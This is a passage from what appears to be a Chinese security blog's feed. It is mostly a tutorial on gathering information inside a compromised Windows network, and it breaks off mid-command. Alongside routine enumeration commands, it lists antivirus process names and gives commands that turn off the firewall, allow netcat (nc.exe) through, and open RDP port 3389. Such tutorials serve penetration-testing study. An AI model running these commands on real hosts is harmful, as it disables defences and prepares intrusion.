0f2a581ddd9b62b262852361d34795594ab95ef99cbb8357ea975fab81fd9fa5a8cf2c9c1a58008db886098518c9e2035feee5bddbc97e7c0e77e1e7a86f48fd97ca991740e5d55686b4aba6f46f809596ca640cc7bfa231392a0378f3a92ccc39e22ef27071054502454d4ae39af7b88c9b3557623c97ecaff690f07d43b3b7a6565b944c3a7f2ae0db7e15ae86d9dd1ba5106786646cfbc872e8676b69be9538ed25e5615fcd753f84cdcd34e8e55ee33bedf8fd91946be7b63bae9374eb01b57bda238bb3a33b01215e734bd0293f4cfc1ebc063d5bb3ceb7ff12f6fcaa2375f68829996fb147f4f3c2b7e797501ba2eda3da796eeb9fbcbb43e54bfb071a40bbe930064ca90a72b5bd8f3fa98835ac168f548a363adc7ea6a3a6d0aa4a719ccef5c481dcf54ac30ec416615e716509ff7a446a9d79a528ed7912b96ae7e693a17daf863d2fe65c287980d55c8091fec8bf63d9b1eefef171e6fd918240f39e3445bfdba58db4dde41b7af1fd97fb2c09611f0de7caeb3ba819be84eed0ddf448ed2d1ce66fb82352a892e701080f1f80aa324ef4ee356d11ab7549dc1f03a6f5a9564ebd1a64c08206202968d7aaa6b4fabded155a8ffd526f422d8bdb6ced523cce2c597bd269c64b5d0436310e6c00a3a340746446b4b6a0e355165726d3e778e8e6bef02bcd40e616f93bc4528bc6dc88726837e57d3176a4cddf22647ea7ef7f90bec3e534758587a42e33bed19556c4043b005c0784b4f2ab2b8944f5f09a21e0bf4017ae24b4b041d599389eb5ff620fb8baef631beaa8b13ed691e6c3dfb666306a5464219b73761bd6bfa6024793c4f2953646ac391a122133456a13937dcdc7e92a62f592d0b1884952f19560675c395d9cb9caa7afa12ca2dbb38b83662def19cf64ec2f0c68798ebc56733b9e26973dfa51d8d306602a224617f55e3fb59ce3dbb6b9f78451044c6109ca1a09ed7ab2fbcc045a5d48b27ba1bc506032b8a986e09503f687632d4bb9398e8c01093bc88ed8620af4c957ec543e75ad0bdbb419a34db1a903bf2341697a942f70d661ef129a65283dda913818e2957c1e0ea7ed53057043825a5ef505575e7a93c44a2e87e1f193ff1cf141b405c54516f7a3a43debf7e2ca2fa6d3d933d0f0b5b686bdbe7ea345da2bd8192cc366523c61bd7dd2a2fa8198b28d29708077ea332bd985e34f760bcf77b713e33e2ff32e2fd27f27d654176feed5631666099de77b97dea2be427e5ce8927168de379d6d1389a80a74d7c0e0ddc20e73feb80ed846e474a407a855ce26ee9d018d8626cb01b90b1fed8c2a31b18eefd0e32ce576df856d59d88e62c4b45cc1edf8fb9762efe1508ae7b24c86b896d8da0164a6de80f4eb724562b7f9f65ba48d29d5eeb212a8766b65fe8890766f94bebfdaa4ba4c967ace4eb67d05eb753e0e06d8d9da6f63f087a3cf5bf8ae580faf2c3c02a7cc2987dac09fb7ddb8666c8fc6b28f526f66c47346508af37dad9b7e05d32a2bae4a35c3703eb78900f50b1388a3b8ece4206b86a3f166b4e3e92e84ebbc80fede5e4bf3bc7ba5986d664e7afc1cac851fa8a1ece0d9c353ab249f2b29b1b75a041dc8bcf18934b275d161298159d150fb794bfbc1f272a06b39bbf4f4356422dcc61c268291662086538f4b5738a338665f7c6a4fae9fcd2af6fd9f1eff336890ae91784d6f12be6345d562ae158956d983beba868bf3cebed50f66f50e0f9595f8f3ba23bb846522ec64675fd70b3e0bc98d79a35e2441d961134c6078dc328c345ea8ae76b316c2c39ef55c2d4b07a7f5d8dcbad3a4ef0d3be9ebb1e681531c124edd560916abd8bb7c60e7781177734b8cfb472890726c5af13e77dad929f4614d03bacb95784a6d800b1738b0141ea55074c0711611f77794184c4b970a63fbf5cf088e3142cc5872567bb176156a72cbdf0f8b2430205762761efa67d2f7dd463d4aa6f4c52e45b1b8e9c95c44978b822c02949e7c6ad7fd3d0253ab5ea7bf00c017431e2bd57097534c6aaa22fd776eaafe15681700bc6c08e4b50322f7d69c00a3bebe66f2ecf0543a46251c92efefa729088cf11360da64eda645773dbccd5abd24d36cb345efaa4e8d02fe33cfa60c5885bfb00ede19737f47fe52dde521a7036f95472eb0110a025e06965f8cd13f8833f4e1bc2d5f5b19e89956a6cfd3661697d49c41d9d36726f075a3dffa5ee84f4308a881de75af5cb7f8d9b8076723741c0b8d4961e2372194531193928144398b66bfd63cd0995c6c32b80a2fec1eaeb56c8b7f71cf284cba66e8912e5958b91aa685e981741fbc8e3773cb0af8eb09e506ebb22e4247cc789f213af95f5573416d28af27e7ba3d33e4ddd67b10dbed1c0d0b796c549a6441644e52a8857c8145b4648a656686c1436072cb0569b6b231681d3bc53f65196a086bb06dc85eab959a8ef973004c8a33fffb613d42628c09979045a4ad0a1c409d91e757410e3510b96557c489001c0636c045fa6588c5882196422c42eec06d96cf33a2064a503736733e6dc010a965f19fa231f134b08eb0704a0b3506e395de45629667f90a6f32bc309907e036a18a38e386c268a9d594d5ecd80dd7ae94f7b4652bd02e269b6b0c7c544d3b089d6f8be9bd5de5c9523b8e123995acef6cb6617000cbefcc6939ba45aea09367ec124b25657dbfe00fbe6adb52d17115711edcdd1032e35f4833cec5c56cb802b96e8106b20047dd7c1248e0c76b59f0acce28d9501cc8d6d7bf6c346136f69101f6f1278b6873853e02bd49021e8593f3c1c2e4479eb32b86c784086288784e4d8487f2238f061ee6c7537bf5196000ec10a0f44e440289ee495920d4cefdc2a7e0cbcfd3890a2fbed79f2827ed85795eb7e1f151dd45a6565602eb93f9a6738200f4efdf8ad4f85bc0794f1f28d054207a155a187e02500e14cd2592402faf2920701eacaef48d655082868c865825aadb44b80cffea7dd778c63f47c49cb7d3b418dfe8f3595d079ea389c32ca63aee3c5e32b0d23ffd3ca643785ce955d6f61a6cb6559d437723b25642013e757b36f1e075ccc68bfc97efcab6ce6f1c9110ac056a9a28f4653f488858daadb2c43b92d9b103617dacb8e8a79893fc293584db12fb3b6241681a0c0123914dfe57e44ae62b4d63f58a448da551f8ad95a2281058c6edab750d196dd396a5b807d1de8db2db4cf5548f813d541f311cafd2e2a08e992cbf9a32f0f24a5df415d3842346868eaa58b52559253300367cde8350feaefe08ac13421f4f1a36289175d911d555f7bf395062b1a20ba8160ff375a50a121b7f4cc07439743f83c2ed7440110550873638539100ec04e46e97ffeeaa85754b6f1f1ed1c5330edf2becfa104efbca3615c5f0389bc34f613914ac9a8e9110b4ccfe2ac6cd6dff4307a0a7aa8b19a7d92e9ffd3747210584373d203c4fb7624d7d52d183942f0d8ded721fcce178ef402884abed572cddb193cf778321523c2e273d3e2e2e240a2ff00fc7a47cdf5d44d7d714e75b1c8c8191e88f864e5045a7ab958d90828b5d6e859d0bed79fe5437386c42cddee2602795ab2fd48244c0f177e74378499b189cfd03550c2ed32ac6d0b11d247861308a4cb9a20b4383e7236bbdac791a2ebe75007d24612c1111a273e85eec986a1bbc3c9de6280d53efdba0bfc873bd94bec1f4d7e214c9452d3c9d5ead3b78ff9c873400e39d1c56893b72100fbb7ade24c63b64d87521d5281884e2825b8696dc58546636766d745fe6c10be9bf6bc64f6559605bcc3b49959b4850c933818adbb8adb9aa70434786a8c5ac23e19e0d36088a229db7cc74ffda5a5106f9179548de083578914b4b9516cf8fbcdbcb202dcb1ea3b41cff1f1beb3972554796ff2fa471f5f61d63c44019dc0cb65c2ca3702f7c94ab9d50e211c2b3b07c94eeb97a7702114f26b3d1bfa709c4c7ca1072b8e98014d8fbde4c53d5ccb4e0eccec6aebfe40d552f4681b7f60cfa9eb1926b6c6b148d15d80fb008ce19edbe3721a039aad7d56568a813fa861f5c16ab0499963203f51fbdf08ee9d576e275e3c7d22b414512c9f9c08e671cf23f9058b37da5594fd13641acd7a531dfb4dd5e9fe3b6f3ac715a8b6871a9d36a426978136e48fe86d6ae4ce57229adedd1864ba135b1af25af2c81065873e92695bbbb1619cb277e6179499eb6905c8beec7b639f297439d95da4dbef7849bfc26cf6ac2552c49d0a1415df17eb7dd87e22a3d017f53b40c399064afb8d5f8976972801cebda76fee8a67598bc7e0aac8f41258d7e7a7d58c983025430a977e222e0a4e6c2b1dc5203a40ab7139162d7b59f8a779db89c4d579c18148ea7989aa42c4f3158d6f4242915b0167a22440b46260140835980aab8b438d1d6ce0aea32a3cb3bf20cd276646cc0bc8aff9cfcefc1ed204de0e669c77a6afb5c5f3787bacec20760b4f39317af449fe97fe39f23045c13f4e9bccc68781ca951f9810946271f0ccd6614e89b941476938d09f112b6dabe64954b59b761f0d6c3b830a27f1af2d63a7233865998372ed8cd56dad40683dfdb191cf78fc367f44b7efcc9be5c3ba07f13b8fccb19205a0dfa37c0e5f13973a3eea02a62866afbe6892f4504f647e9848db097c24a718f658014ddc22dc3ee567de8644799f28bc6ef8f357c599e57f1da4cd8193101211bd54e231f2a5504a3c65124850618c715567c82ad7d49eef1d51729f98437986f33d7eb83eb27d9012497e5b3918f36184d5dd3bdf6d5d2b0ff804b3b114c6a8778ee0f5d6875bb69206cef18c965ce0051078d94275cf14e48cb2875f6ac1c090b84433210dc8c2a8c64c39b10e856ae378527f21f06e2bf6667b9b3bdcee475b83afb398c304f20fb162abe6154368930a4368aac2ec1cdcf2401cc530c561bac019f0888f4b2d19dedbdc72390b3a828d0871dacb482715b465f55733e275e63390f9b62fadb41bb155a7579a39be79388d733ee0f893abb67440a0a72371fcab371c5d902b465b7f82499696a4dbc5cc52fbe4eebe27f2f4713d208c3016a18d48410b437d87a6095f9cfb17dad6f695cd7861d31d24b378b4601a43badd0d921252d279c7fd5ec34cbc71f7a15065ed6cff5cc0535385f4fe15f2ac2beec3522a479c84ae516f1b427309d27332bcd07da2fa1125bdbc48831bef93f587acca011496b67987f4570324584fd1ab8b9bb7c5cd8a2742f028fa101bfab0acb9cd86403e606de0c20a42818bd44ee0c0d8e5e36f27d7012f67b8785475585c4a1ede59dafddc329f00a747b2048e0206f8771969734a4f35ddcd438b4077ee67a6539d515a48bc23fd60337e3af7dbf1a7bf5cf34a57bd568d8d8234646a15420d530cde8bcdffa07b517bab8549b21d1992064ea83de5df0f6f28aef38e8a1855f5474af5820bd0683bf701a2ceb332da730ab20ad922dc9808e3cb5f6ecd27e0ae6450094b509a371b22d60f4b992f18ba1b1d57684c79e01864d2da709f84720b34ec54c67d0ffb7b0dcfa27542e89bd9f2b41db20c8a3c1789a224dd67f94d9930f2ea0df63eb5c1fc26eb0201243c72f8ed6bdfd47c0df48131ebe48339ad4cd0132b95d2a2bc00b0c138ad3c6e214c86af304eea4eea2a1a6a7b435b0303d78a73d2a09e79c11d3fb0cce3872b7a13cd578c27eaa10592ab45a5c6ff62a21a5268e0458acb27ebda503b33f15eed1337e460606c9fc3dd7b03c300eb2269a33779e234f2f40230c64ef5793bae85d4b46e7a81c80e96d729df74c4bafb9dba85493d9325f9a2106a05eb1c1c6f3b103a931b9235017e9daac6eebd394bb6b00eb4eea1184443aaaa2452e1e2f8598c482638d9f293e0994d057ca14376bcfb7b4f123fb7458fb1db46888209c2ff88f2caeffb11acc0dfd1c0600f14166203f67da24257e4760fb96963b9155ac0c579fc51678fdf7f75c2279d04e83bf0bca07cef4184b48e49cd8d356370b7852e280da482af24c1931eebd9a9957a33ec105a27aa29f2622f3456a3bad840383fa3b9cf80352cb4731ea0726646f115b317fc692c8bea8e54e23e676fb1f0deff17b262dc3fb54092969d77e37857bac7ef4c4107ddc9353b0f4f96d6e16b8bae1afd2789c6e28283db170e74e8787349f57ffab6aea3f0eef91599334a81d6b3a0fe0ef74dfb1ba7e16d55410a564d9f6d6e25bd949e4539fad3b75eb9e30714c60678b1903c8a73e90da48fbaa36c5b70d8ae4b2324f1391fa732fa4d91e1189163ebe29ee0a90b06ba5d9a5f31db29aaabcfb356aab0f63222ecf9e249909c87b401a443e670cc92383c6838e79953081485ec3c616ac16f562ede60060f48a08c1c56094fcdcbeff4608257bd59675c93778a1caff1715dfa5b5d679d6f1a93ec808be733c41e3eb7618fed0bae89e847f64cf9cc76ad0bf009e3999e7fe0003db951af03ccc86b1e3c20324bffd5de17f9a6b0653e4cc8f525cd571bc2efa400489c82ebebe432e90ce0d9baf9a11ac547331d25b53fc4762bfcc3b184ab13ed4d45d77badfbf79f0ba88fdee175bf606596e8642c874ded23f45867a9547e5fb8c537b5cf4b8dcd29c40c0ce893833c897a76ad7a0742b88a525bad39fcbf6df8b26c907887e994d45818e71d84cf8929a53fd29a1da61f63c586d9eb71d47599f38cd9ca39f9c44c73484a8c7636a5af5c4a5509391a288fcee3a5db308c1376a45be1adb6ee11a2c9506fe66c5c1544a9f74cdfbc1dd5c2dfdc9d8a1e49bdd4b064a3f3c922648422429ebdd6d831ae5817b523cf3a2908a9554f05695d8713204618958c9259d8333f329be3cac30a0c2e314dd74ce3e512fb6eca2db87248c743d42a9777b354cede6fbdc04204a73e4ba9e231ceec0b799cdc266e1088c415a208d67d4f5de470347c5d4a7d78e6881faf1111d81660e3688def8b6a2e58ec1f37dc72466367603e01ee6b89b3d5b31ac6d5889230115b35ab0f3a759a8e41f90e305b9eb89006ad6e2e906869e04c83aa37e9fee3043463609589306af71dcd96c8d2c7e831ae811750a752f17598f00d72d9d1e95c1458875bbb39235d6e19feed2f0232f92e2828d2e49ffddc8dabaf58ceb2e90490106461ed21e907552c0818320899e77fb2af1061913e4aaa10b15075741c5c014338f515e2012a91ba9dbc9586a20a5a7c0ef17cb75829b40b0c85949aa3d4edb419439a3c1eadd14ac2756ca402f624323ea996576a3a3ce5bb8eaaa0be8f5b22bccc5446cbfb107576d0b4010b81b167fc86b71e8d1021b15b98f3e554898fbaf63d458599ea1d906129f4b5544c2113124148c78b9e3bec74b06adc393f1e124b70c60362ccf593521b6665835adc33855e7ddf917c5f41b9f8096656ca779edb34456ecd9e1277d1d36d38b452344a23646e2ca4c6ebb2497d70309bb3b864bed4822ceb9ecd1329dce78edf1c30e583e1c97de48876e0b607e9d5fb61b473f95bed4f0b5e1b3d5961261c12e8d03ce5c7d85805a6cca8c007281a260096a743ab8a3a04cb1819cc8b42d75b3c4b3fcf97ff42f2ef473a302e1b3604760982768566a1f9ccd73b809e2008f8ce413169a525c3d1d3e578157a5a863adef584616f091dc09fa52efd693b5921f9550da3118f9f22c76dc8498dfec75cff4a90228cc64d9a3c8a6af1843654ab40e80465978e2c99f84bb2192581a7120e3cbadd04cd84806bb0b9b2834615028569fb62b8705f14f3ee2a2902cffc35570418dbefe3d028ecf4c288ad2495d7a349f020e33aab72d04249b50512f99bda03b1917c2bbc919912533854a3518ea6d13fd2fc440f76ae7f5fe14d9cfa3a0115eab78521d253f89ab4632bba7453b39a28bf415bd8fec6c62033f6186fc7e39756f382c680343181c8dafd73d26edf7e81ae65b6f60f780331bc100cb563e13820386b28df7da4ef664ecb04838792fd384d90088e81f64d9cc86c119d8f91a5db79ae1690768c633d66c7ccadf22b6065edd23aebdbefc7de4dc945762bbc55c373c9e6e424e50f8021ddbbed140488ab2abfcf44e15f5116d0111cb01bdbbf7c1c250d99624c94352f21ba05345d83830dda16eda161cbe3cce157f1088f62b8b718f689ce7b65caf300ea8ab98330fe0556e44940985e93052fbfa27b89eb6037853c22addde13582dbda4c36f843b9fec8ccfa1ff9ab0199760cf2a9d51aaa76e269606b4aa49ec6a7029f981f587f5bdbde6fddfd6d391c5429596b0701d64842c605d9e43852cc4dd343d9f49491a28db4789892a21f5d0913c5fc9fbe5439534e743fa593c3ed34d0478c7779c7791ae8870fba49ec2d27ce72c1eccaee89642c5b723ad06ce081a2a9b5c303c7a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>CrackMapExec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>1.查询网络配置命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>2.查询操作系统及软件的信息<br>1）查看操作系统和版本信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br><span class="hljs-string">//</span>适用于英文的操作系统，中文的：<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><p>2）查看系统体系结构</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142506961.png" alt="在这里插入图片描述"></p><ol start="3"><li>查看安装的软件及版本、路径等</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142637625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Powershell版本：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">powershell.exe &quot;Get-WmiObject -class Win32_Product | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> -Property name,Version<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142754294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查询本机服务信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service list brief<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121142926745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查询进程列表</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist<br><span class="hljs-comment">//或者</span><br>wmic process list brief<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012114304243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>常见杀毒软件进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">360s</span>d<span class="hljs-selector-class">.exe</span><br><span class="hljs-number">360</span>tray<span class="hljs-selector-class">.exe</span><br>ZhuDongFangYu<span class="hljs-selector-class">.exe</span><br>KSafeTray<span class="hljs-selector-class">.exe</span><br>SafeDogUpdateCenter<span class="hljs-selector-class">.exe</span><br>McAfee McShield<span class="hljs-selector-class">.exe</span><br>egui<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//NOD32</span><br>AVP<span class="hljs-selector-class">.EXE</span>  <span class="hljs-comment">//卡巴斯基</span><br>avguard<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//小红伞</span><br>bdagent<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//BitDefender</span><br></code></pre></td></tr></table></figure><p>5.查看启动程序信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic startup <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span>,<span class="hljs-title">caption</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143252334.png" alt="在这里插入图片描述"><br>6.查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143341613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7.查看主机开机时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> statistics workstation<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210121143415172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>8.查询用户列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">//获取本地管理员组成员：</span><br><span class="hljs-title">net</span> localgroup adinistrators<br>//查看当前再线用户<br>query <span class="hljs-keyword">user</span> <span class="hljs-title">|| qwinsta</span><br></code></pre></td></tr></table></figure><p>9.列出或断开本地计算机与所连接的客户端之间的会话</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><p>10.查询端口列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>11.查询补丁列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>12.查询本机共享列表</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">net share<br><span class="hljs-comment">//wmic:</span><br>wmic share <span class="hljs-built_in">get</span> <span class="hljs-built_in">name</span>,path,status<br></code></pre></td></tr></table></figure><p>13.查询路由表及所有可用接口的ARP缓存表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure><p>14.查询防火墙相关配置</p><p>1）关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">//windows server <span class="hljs-number">2003</span>之前<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br>//Windows server <span class="hljs-number">2003</span>之后<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofile <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p> 2）查看防火墙配置</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之前允许指定程序全部连接<br>netsh firewall <span class="hljs-keyword">add</span> allowedprogram c:\nc.exe &quot;allow nc&quot; <span class="hljs-keyword">enable</span><br>//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之后的版本<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;pass nc&quot; dir=<span class="hljs-keyword">in</span> action=allow program=&quot;c:\nc.exe&quot;<br>//允许指定程序退出<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Allow nc&quot; dir=<span class="hljs-keyword">out</span> action=allow program=&quot;C:\nc.exe&quot;<br>//允许<span class="hljs-number">3389</span>端口放行<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Remote Desktop&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br></code></pre></td></tr></table></figure><h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4)自定义防火墙日志的存储位置"></a>4)自定义防火墙日志的存储位置</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall <span class="hljs-built_in">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span><br></code></pre></td></tr></table></figure><h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></code></pre></td></tr></table></figure><h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1）查看远程连接端口"><a href="#1）查看远程连接端口" class="headerlink" title="1）查看远程连接端口"></a>1）查看远程连接端口</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br></code></pre></td></tr></table></figure><h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2)在Windows server 2003中开启3389"></a>2)在Windows server 2003中开启3389</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3)在Windows server 2008和2012中"></a>3)在Windows server 2008和2012中</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmic /<span class="hljs-keyword">namespace</span>:\\<span 